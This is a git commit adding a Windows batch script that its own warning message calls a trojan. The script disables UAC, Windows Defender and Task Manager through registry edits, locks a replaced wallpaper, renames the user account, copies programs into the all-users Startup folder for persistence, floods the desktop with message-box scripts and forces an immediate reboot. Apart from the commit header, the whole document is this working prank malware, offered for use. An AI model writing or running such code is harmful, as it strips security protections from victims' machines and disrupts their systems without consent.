266d6103ca881a407e92b99dd92fc318eed45e86
Err01 <132213761+Err01-Hub20@users.noreply.github.com>
2023-06-05 20:38:38 +0200

    Create  Main code.bat

---
+++ Main code.bat
@@ -0,0 +1,133 @@
+:: Made By Frank
+
+@echo off
+color 4f 
+echo The file you just executed considered Trojan. If you know what your doing press simply enter. The creator ( Frank South 20 ) is not responsible for any data loss or damage.
+pause 
+title SPONGEBOB IS WATCHING YOU!!!
+cls
+del %systemdrive%\bg.bmp /q /f
+copy /y bg.bmp %systemdrive%\bg.bmp
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\bg.bmp /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+reg.exe ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+net user %username% /fullname:"SPONGEBOB WAS HERE!!!"
+copy /y MainWindow.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+copy /y mover.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+copy /y kittyspeak.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+echo msgbox "Kitty is waching you!" > %systemdrive%\users\public\desktop\NOESCAPE%random%.vbs
+shutdown /r /t 00
